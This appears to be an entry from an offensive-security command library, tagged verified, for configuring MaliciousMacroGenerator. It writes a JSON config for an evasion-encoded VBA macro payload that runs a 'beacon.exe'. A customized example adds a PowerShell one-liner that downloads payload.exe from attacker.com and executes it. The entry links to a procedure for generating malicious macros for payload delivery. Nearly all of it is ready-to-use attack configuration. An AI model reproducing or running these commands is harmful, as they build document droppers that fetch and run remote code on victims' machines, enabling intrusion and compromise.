---
type: command
executor: bash
data: |-
  cat > configs/generic-cmd.json << 'EOF'
  {
      "description": "Generic command exec payload\nEvasion technique set to none",
      "template": "templates/payloads/generic-cmd-template.vba",
      "varcount": 152,
      "encodingoffset": 5,
      "chunksize": 180,
      "encodedvars": {},
      "vars": [],
      "evasion": ["encoder"],
      "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
  }
  EOF
output: null
created_at: '2023-04-06T03:56:23Z'
updated_at: '2023-04-10T20:36:49Z'
platforms:
  - Linux
tags:
  - config
  - setup
verified: true
validated: true
---

# create-generic-command-config-for-mmg

## Command

```bash
cat > configs/generic-cmd.json << 'EOF'
{
    "description": "Generic command exec payload\nEvasion technique set to none",
    "template": "templates/payloads/generic-cmd-template.vba",
    "varcount": 152,
    "encodingoffset": 5,
    "chunksize": 180,
    "encodedvars": {},
    "vars": [],
    "evasion": ["encoder"],
    "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
EOF
```

## Description

Creates a JSON configuration file for MMG specifying a generic command execution payload with basic encoder evasion, targeting download and execution of a beacon executable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| configs/generic-cmd.json | Output file path | Yes |
| payload | Custom command to execute the downloaded file | Yes (edit as needed) |

## Examples

### Basic Usage

```bash
cat > configs/generic-cmd.json << 'EOF'
{ ... }
EOF
```

### Customized Payload

```bash
cat > configs/custom.json << 'EOF'
{
    "payload": "powershell -c IWR -Uri http://attacker.com/payload.exe -OutFile C:\\Temp\\p.exe; & C:\\Temp\\p.exe"
}
EOF
```

## Expected Output

No direct output; the file is created. Verify with: cat configs/generic-cmd.json showing the JSON structure.

## Related

- [[procedures/Generate-Malicious-VBA-Macro-for-Payload-Download-and-Execution-Using-MMG]]
- [[tools/MaliciousMacroGenerator]]
